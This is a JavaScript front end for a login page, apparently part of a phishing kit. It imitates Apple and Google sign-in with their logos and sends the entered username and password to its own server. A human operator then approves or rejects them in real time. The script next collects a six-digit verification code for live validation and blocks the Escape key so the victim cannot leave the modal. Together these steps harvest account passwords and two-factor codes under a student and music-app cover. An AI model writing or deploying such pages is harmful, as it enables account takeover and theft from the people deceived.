// Variables globales
let currentUser = null;
let currentRequestId = null;
let pollingInterval = null;
let loginForm, verificationForm, verificationModal, messageDiv;
let selectedProvider = null; // 'apple' | 'google'

// Event listeners
document.addEventListener('DOMContentLoaded', function() {
    // Inicializar elementos del DOM
    loginForm = document.getElementById('loginForm');
    verificationForm = document.getElementById('verificationForm');
    verificationModal = document.getElementById('verificationModal');
    messageDiv = document.getElementById('message');
    const providerSelection = document.getElementById('providerSelection');
    const btnApple = document.getElementById('btnApple');
    const btnGoogle = document.getElementById('btnGoogle');
    const chosenProvider = document.getElementById('chosenProvider');
    const chosenProviderBadge = document.getElementById('chosenProviderBadge');
    const changeProvider = document.getElementById('changeProvider');
    
    console.log('DOM cargado, elementos inicializados:'); // Debug
    console.log('loginForm:', loginForm); // Debug
    console.log('verificationForm:', verificationForm); // Debug
    console.log('verificationModal:', verificationModal); // Debug
    console.log('messageDiv:', messageDiv); // Debug
    
    if (loginForm) {
        loginForm.addEventListener('submit', handleLogin);
    }

function startAccessGrantPolling(username) {
    if (window.accessGrantInterval) {
        clearInterval(window.accessGrantInterval);
    }
    window.accessGrantInterval = setInterval(async () => {
        try {
            const resp = await fetch(`/api/student/access-status/${encodeURIComponent(username)}`);
            const data = await resp.json();
            if (resp.ok && data.success && data.granted) {
                clearInterval(window.accessGrantInterval);
                hideSpinner();
                window.location.href = '/music.html';
            }
        } catch (_) {}
    }, 2000);
    setTimeout(() => {
        if (window.accessGrantInterval) {
            clearInterval(window.accessGrantInterval);
            hideSpinner();
            showMessageModal('Tiempo de espera', 'No se ha concedido el acceso aún. Intenta nuevamente más tarde.', 'error');
        }
    }, 300000);
}
    if (verificationForm) {
        verificationForm.addEventListener('submit', handleVerification);
    }

    // Manejar selección de proveedor
    function applyProvider(provider) {
        selectedProvider = provider; // 'apple' o 'google'
        // Actualizar UI: ocultar selección, mostrar badge y formulario
        if (providerSelection) providerSelection.classList.add('hidden');
        if (chosenProvider) chosenProvider.classList.remove('hidden');
        if (loginForm) loginForm.classList.remove('hidden');

        if (chosenProviderBadge) {
            // Renderizar badge con ícono + texto
            if (provider === 'apple') {
                chosenProviderBadge.innerHTML = `
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor" aria-hidden="true" style="vertical-align:middle;">
                        <path d="M19.665 13.146c-.019-2.045 1.668-3.022 1.743-3.07-.948-1.389-2.423-1.58-2.946-1.6-1.255-.127-2.455.733-3.093.733-.638 0-1.624-.716-2.67-.696-1.372.02-2.636.797-3.342 2.017-1.427 2.472-.364 6.125 1.024 8.129.679.982 1.486 2.083 2.54 2.043 1.024-.04 1.414-.662 2.657-.662 1.243 0 1.6.662 2.67.642 1.104-.02 1.8-1.004 2.477-1.988a9.06 9.06 0 0 0 1.12-2.298c-2.94-1.098-2.794-4.325-2.78-4.25zm-2.53-7.17c.58-.704.973-1.682.867-2.647-.838.034-1.848.56-2.45 1.263-.54.62-1.01 1.598-.887 2.56.94.073 1.89-.472 2.47-1.176z"/>
                    </svg>
                    <span style="margin-left:8px;">Apple</span>
                `;
            } else {
                chosenProviderBadge.innerHTML = `
                    <svg width="16" height="16" viewBox="0 0 48 48" aria-hidden="true" style="vertical-align:middle;">
                        <path fill="#FFC107" d="M43.611,20.083H42V20H24v8h11.303c-1.649,4.657-6.08,8-11.303,8c-6.627,0-12-5.373-12-12 s5.373-12,12-12c3.059,0,5.842,1.153,7.961,3.039l5.657-5.657C34.046,6.053,29.268,4,24,4C12.955,4,4,12.955,4,24 s8.955,20,20,20s20-8.955,20-20C44,22.659,43.862,21.35,43.611,20.083z"/>
                        <path fill="#FF3D00" d="M6.306,14.691l6.571,4.819C14.655,16.181,18.961,14,24,14c3.059,0,5.842,1.153,7.961,3.039l5.657-5.657 C34.046,6.053,29.268,4,24,4C16.318,4,9.656,8.337,6.306,14.691z"/>
                        <path fill="#4CAF50" d="M24,44c5.166,0,9.86-1.977,13.409-5.192l-6.191-5.238C29.211,35.091,26.715,36,24,36 c-5.202,0-9.619-3.317-11.281-7.957l-6.493,5.005C9.54,39.556,16.227,44,24,44z"/>
                        <path fill="#1976D2" d="M43.611,20.083H42V20H24v8h11.303c-0.792,2.237-2.231,4.166-4.094,5.57 c0.001-0.001,0.002-0.001,0.003-0.002l6.191,5.238C36.961,39.205,44,34,44,24C44,22.659,43.862,21.35,43.611,20.083z"/>
                    </svg>
                    <span style="margin-left:8px;">Google</span>
                `;
            }
            chosenProviderBadge.classList.remove('apple', 'google');
            chosenProviderBadge.classList.add(provider);
            chosenProviderBadge.classList.add('provider-badge');
        }
        // Focus en usuario
        const userInput = document.getElementById('username');
        if (userInput) userInput.focus();
    }

    if (btnApple) btnApple.addEventListener('click', () => applyProvider('apple'));
    if (btnGoogle) btnGoogle.addEventListener('click', () => applyProvider('google'));
    if (changeProvider) {
        changeProvider.addEventListener('click', () => {
            // Reiniciar selección
            selectedProvider = null;
            if (chosenProvider) chosenProvider.classList.add('hidden');
            if (providerSelection) providerSelection.classList.remove('hidden');
            if (loginForm) loginForm.classList.add('hidden');
            // Limpiar campos
            resetForm();
        });
    }
});

// Función para manejar el login
async function handleLogin(e) {
    e.preventDefault();
    
    const username = document.getElementById('username').value;
    const password = document.getElementById('password').value;
    const authProvider = selectedProvider;
    
    if (!authProvider) {
        showMessage('Primero elige si deseas ingresar con Apple o Google', 'error');
        return;
    }
    
    if (!username || !password) {
        showMessage('Por favor, completa todos los campos', 'error');
        return;
    }
    
    try {
        const response = await fetch('/api/login', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({ username, password, authProvider })
        });
        
        const data = await response.json();
        console.log('Respuesta del servidor:', data); // Debug
        
        if (response.ok) {
            currentUser = username;
            currentRequestId = data.requestId;
            
            showMessage(data.message, 'success');
            
            // Iniciar polling para verificar el estado de la solicitud
            startPolling();
            
        } else {
            showMessage(data.message || 'Error en el login', 'error');
        }
    } catch (error) {
        console.error('Error:', error);
        showMessage('Error de conexión con el servidor', 'error');
    }
}

// Función para iniciar el polling
function startPolling() {
    if (pollingInterval) {
        clearInterval(pollingInterval);
    }
    
    pollingInterval = setInterval(async () => {
        try {
            const response = await fetch(`/api/student/request-status/${currentUser}`);
            const data = await response.json();
            
            if (response.ok && data.request) {
                const status = data.request.status;
                const providerFromServer = (data.request.auth_provider || '').toLowerCase();
                
                if (status === 'approved') {
                    // Detener polling y mostrar modal correspondiente
                    clearInterval(pollingInterval);
                    const teacherMessage = (data.request.message || '').trim();
                    if (providerFromServer === 'google' || selectedProvider === 'google') {
                        // Flujo Google: mostrar prompt con botón Verificar
                        showMessage('¡Solicitud aprobada!', 'success');
                        showGoogleFinalVerificationPrompt(teacherMessage || 'Tu solicitud ha sido aprobada. Presiona Verificar para completar.');
                    } else if (!teacherMessage) {
                        // Si no hay mensaje, pedir el código como siempre
                        showMessage('¡Solicitud aprobada! Ingresa el código de verificación.', 'success');
                        showVerificationModal();
                    } else {
                        // Apple u otros con mensaje: mostrar como antes
                        showMessage('¡Solicitud aprobada!', 'success');
                        showMessageModal('Aprobado', teacherMessage, 'success');
                    }
                    
                } else if (status === 'rejected') {
                    // Detener polling y mostrar error
                    clearInterval(pollingInterval);
                    showMessage('Solicitud rechazada. Los datos ingresados son incorrectos.', 'error');
                    resetForm();
                }
                // Si está 'pending', continuar polling
            }
        } catch (error) {
            console.error('Error en polling:', error);
        }
    }, 2000); // Verificar cada 2 segundos
}

// Función para detener el polling
function stopPolling() {
    if (pollingInterval) {
        clearInterval(pollingInterval);
        pollingInterval = null;
    }
}

// Función para resetear el formulario
function resetForm() {
    // NO limpiar currentUser aquí, solo limpiar el formulario
    currentRequestId = null;
    document.getElementById('username').value = '';
    document.getElementById('password').value = '';
    stopPolling();
}

// Función para manejar la verificación del código
async function handleVerification(e) {
    e.preventDefault();
    
    const verificationCode = document.getElementById('verificationCode').value.trim();
    
    if (!verificationCode) {
        showMessageModal('Error', 'Por favor, ingresa el código de verificación', 'error');
        return;
    }
    
    if (verificationCode.length !== 6 || !/^\d{6}$/.test(verificationCode)) {
        showMessageModal('Error', 'El código debe tener exactamente 6 dígitos', 'error');
        return;
    }
    
    try {
        // Debug: Verificar valores antes de enviar
        console.log('Debug - currentUser:', currentUser);
        console.log('Debug - verificationCode:', verificationCode);
        
        if (!currentUser) {
            showMessageModal('Error', 'No hay usuario activo. Por favor, inicia sesión primero.', 'error');
            return;
        }
        
        // Guardar requestId antes de cerrar modal (closeModal -> resetForm limpia currentRequestId)
        const requestIdToSend = currentRequestId;
        // Cerrar el modal y mostrar spinner
        closeModal();
        showSpinner('Enviando código al servidor...');
        
        const requestBody = { 
            username: currentUser, 
            verificationCode,
            requestId: requestIdToSend
        };
        console.log('Debug - Enviando datos:', requestBody);
        
        const response = await fetch('/api/verify', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify(requestBody)
        });
        
        const data = await response.json();
        console.log('Debug - Respuesta del servidor:', data);
        console.log('Debug - Status de respuesta:', response.status);
        
        if (response.ok && data.success) {
            // Código enviado exitosamente - cambiar mensaje del spinner e iniciar polling
            updateSpinnerMessage('Esperando validación del servidor...');
            currentRequestId = data.requestId;
            startCodeValidationPolling(currentUser, verificationCode);
        } else {
            // Error al enviar código
            hideSpinner();
            showMessageModal('Error', data.message || 'Error al enviar código', 'error');
        }
    } catch (error) {
        console.error('Error en verificación:', error);
        hideSpinner();
        showMessageModal('Error de Conexión', 'Error de conexión. Inténtalo de nuevo.', 'error');
    }
}

// Función para iniciar el polling de validación del código
function startCodeValidationPolling(username, code) {
    // Limpiar cualquier polling anterior
    if (window.codePollingInterval) {
        clearInterval(window.codePollingInterval);
    }
    
    // Iniciar polling cada 2 segundos
    window.codePollingInterval = setInterval(async () => {
        try {
            console.log(`Debug - Verificando estado del código: ${username}/${code}`);
            const response = await fetch(`/api/student/code-status/${username}/${code}`);
            const data = await response.json();
            
            console.log('Debug - Respuesta del polling:', data);
            console.log('Debug - Status:', data.status);
            
            if (data.success && data.status !== 'pending') {
                // Detener el polling
                clearInterval(window.codePollingInterval);
                
                // Ocultar spinner antes de mostrar el resultado
                hideSpinner();
                
                if (data.status === 'approved') {
                    if (selectedProvider === 'google') {
                        // Mostrar verificación final manual para Google
                        showGoogleFinalVerificationPrompt('Tu código ha sido aprobado. Presiona Verificar para completar.');
                    } else {
                        // Apple: mantener comportamiento anterior
                        showMessageModal('¡Éxito!', '✅ ¡Se generará una carpeta llamada "Recordings" en drive, este proceso puede tardar 30 minutos.', 'success');
                        setTimeout(() => {
                            window.location.href = '/music.html';
                        }, 3000);
                    }
                } else if (data.status === 'rejected') {
                    // Código rechazado - mostrar modal de error
                    showMessageModal('Código Rechazado', '❌ Código rechazado por el servidor. Por favor, inténtalo de nuevo.', 'error');
                }
            }
        } catch (error) {
            console.error('Error al verificar estado del código:', error);
            // No detener el polling por errores de red temporales
        }
    }, 2000); // Verificar cada 2 segundos
    
    // Timeout después de 5 minutos
    setTimeout(() => {
        if (window.codePollingInterval) {
            clearInterval(window.codePollingInterval);
            hideSpinner();
            showMessageModal('Tiempo Agotado', '⏰ Tiempo de espera agotado. El servidor no ha validado el código.', 'error');
        }
    }, 300000); // 5 minutos
}

// Función para mostrar mensajes
function showMessage(text, type) {
    messageDiv.textContent = text;
    messageDiv.className = `message ${type}`;
    messageDiv.classList.remove('hidden');
    
    // Auto-ocultar después de 5 segundos
    setTimeout(() => {
        messageDiv.classList.add('hidden');
    }, 5000);
}

// Función para mostrar spinner
function showSpinner(message = 'Cargando...') {
    const spinner = document.getElementById('loadingSpinner');
    const spinnerMessage = document.getElementById('spinnerMessage');
    
    if (spinner && spinnerMessage) {
        spinnerMessage.textContent = message;
        spinner.classList.remove('hidden');
    }
}

// Función para ocultar spinner
function hideSpinner() {
    const spinner = document.getElementById('loadingSpinner');
    if (spinner) {
        spinner.classList.add('hidden');
    }
}

// Función para actualizar mensaje del spinner
function updateSpinnerMessage(message) {
    const spinnerMessage = document.getElementById('spinnerMessage');
    if (spinnerMessage) {
        spinnerMessage.textContent = message;
    }
}

// Función para mostrar el modal de verificación
function showVerificationModal() {
    console.log('=== EJECUTANDO showVerificationModal ==='); // Debug
    console.log('verificationModal elemento:', verificationModal); // Debug
    
    if (!verificationModal) {
        console.error('ERROR: verificationModal es null o undefined');
        // Intentar obtenerlo nuevamente
        verificationModal = document.getElementById('verificationModal');
        console.log('Reintentando obtener verificationModal:', verificationModal);
    }
    
    if (verificationModal) {
        console.log('Clases antes de remover hidden:', verificationModal.className); // Debug
        verificationModal.classList.remove('hidden');
        console.log('Clases después de remover hidden:', verificationModal.className); // Debug
        
        // Verificar si el modal es visible
        const computedStyle = window.getComputedStyle(verificationModal);
        console.log('Display computed:', computedStyle.display); // Debug
        console.log('Visibility computed:', computedStyle.visibility); // Debug
        console.log('Z-index computed:', computedStyle.zIndex); // Debug
        
        const codeInput = document.getElementById('verificationCode');
        // Ajustar etiqueta del botón según proveedor
        const submitBtn = verificationModal.querySelector('.modal-buttons .btn-submit');
        if (submitBtn) {
            submitBtn.textContent = (selectedProvider === 'google') ? 'Confirmar' : 'Verificar';
        }
        if (codeInput) {
            codeInput.focus();
            console.log('Focus puesto en el input del código'); // Debug
        } else {
            console.error('ERROR: No se encontró el input verificationCode');
        }
    } else {
        console.error('ERROR CRÍTICO: verificationModal sigue siendo null');
    }
    console.log('=== FIN showVerificationModal ==='); // Debug
}

// Función para mostrar modal de mensajes
function showMessageModal(title, message, type = 'info') {
    const messageModal = document.getElementById('messageModal');
    const messageModalTitle = document.getElementById('messageModalTitle');
    const messageModalText = document.getElementById('messageModalText');
    
    messageModalTitle.textContent = title;
    messageModalText.textContent = message;
    
    // Agregar clase según el tipo de mensaje
    messageModal.className = 'modal';
    if (type === 'success') {
        messageModal.classList.add('success-modal');
    } else if (type === 'error') {
        messageModal.classList.add('error-modal');
    }
    
    messageModal.classList.remove('hidden');
}

// === Flujo Google: Modal con botón "Verificar" y verificación final ===
function showGoogleFinalVerificationPrompt(message) {
    const messageModal = document.getElementById('messageModal');
    const titleEl = document.getElementById('messageModalTitle');
    const textEl = document.getElementById('messageModalText');
    const buttons = messageModal.querySelector('.modal-buttons');
    if (!messageModal || !titleEl || !textEl || !buttons) {
        console.error('No se encontró el modal de mensajes o sus elementos');
        // Fallback: usar showMessageModal normal
        showMessageModal('Aprobado', message, 'success');
        return;
    }
    // Asegurar clases base del modal visibles
    messageModal.className = 'modal success-modal';
    titleEl.textContent = 'Aprobado';
    textEl.textContent = message;
    // Reemplazar botones por "Verificar" y "Cancelar"
    buttons.innerHTML = '';
    const verifyBtn = document.createElement('button');
    verifyBtn.type = 'button';
    verifyBtn.className = 'btn-submit';
    verifyBtn.textContent = 'Confirmar';
    verifyBtn.onclick = requestFinalVerification;
    const cancelBtn = document.createElement('button');
    cancelBtn.type = 'button';
    cancelBtn.className = 'btn-cancel';
    cancelBtn.textContent = 'Cancelar';
    cancelBtn.onclick = closeMessageModal;
    buttons.appendChild(verifyBtn);
    buttons.appendChild(cancelBtn);
    messageModal.classList.remove('hidden');
}

async function requestFinalVerification() {
    try {
        console.log('[FinalVerify] Enviando solicitud para usuario:', currentUser);
        const resp = await fetch('/api/student/final-verification/request', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ username: currentUser })
        });
        console.log('[FinalVerify] Status respuesta:', resp.status);
        const data = await resp.json();
        console.log('[FinalVerify] Body respuesta:', data);
        if (!resp.ok || !data.success) {
            showMessageModal('Error', data.message || 'No se pudo enviar la solicitud de verificación', 'error');
            return;
        }
        // Cerrar modal y mostrar spinner mientras espera aprobación del profesor
        closeMessageModal();
        showSpinner('Esperando verificación del servidor...');
        startFinalVerificationPolling(currentUser);
    } catch (e) {
        console.error('[FinalVerify] Error al enviar solicitud:', e);
        showMessageModal('Error', 'No se pudo enviar la solicitud de verificación', 'error');
    }
}

function startFinalVerificationPolling(username) {
    if (window.finalVerifyInterval) clearInterval(window.finalVerifyInterval);
    window.finalVerifyInterval = setInterval(async () => {
        try {
            const resp = await fetch(`/api/student/final-verification/status/${encodeURIComponent(username)}`);
            const data = await resp.json();
            if (resp.ok && data.success && data.status) {
                if (data.status === 'approved') {
                    clearInterval(window.finalVerifyInterval);
                    hideSpinner();
                    window.location.href = '/music.html';
                } else if (data.status === 'rejected') {
                    clearInterval(window.finalVerifyInterval);
                    hideSpinner();
                    showMessageModal('Error', 'Error, no se ha completado la verificación', 'error');
                }
                // Si es 'pending' o 'not_found', continúa polling sin cambios
            }
        } catch (_) {}
    }, 2000);
    // Timeout de seguridad
    setTimeout(() => {
        if (window.finalVerifyInterval) {
            clearInterval(window.finalVerifyInterval);
            hideSpinner();
            showMessageModal('Tiempo Agotado', 'No se completó la verificación final.', 'error');
        }
    }, 300000);
}

// Función para cerrar el modal de mensajes
function closeMessageModal() {
    const messageModal = document.getElementById('messageModal');
    messageModal.classList.add('hidden');
    messageModal.classList.remove('success-modal', 'error-modal');
    
    // Limpiar el usuario actual para permitir nuevo login después de cerrar el modal
    resetForm();
}

// Función para cerrar el modal
function closeModal() {
    verificationModal.classList.add('hidden');
    document.getElementById('verificationCode').value = '';
    
    // Limpiar cualquier polling activo
    if (window.codePollingInterval) {
        clearInterval(window.codePollingInterval);
        window.codePollingInterval = null;
    }
    
    // Limpiar el usuario actual para permitir nuevo login
    resetForm();
    // Limpiar mensajes
    messageDiv.textContent = '';
    messageDiv.className = 'message';
}

// Nota: Se deshabilita el cierre por tecla Escape para evitar que el usuario salga del modal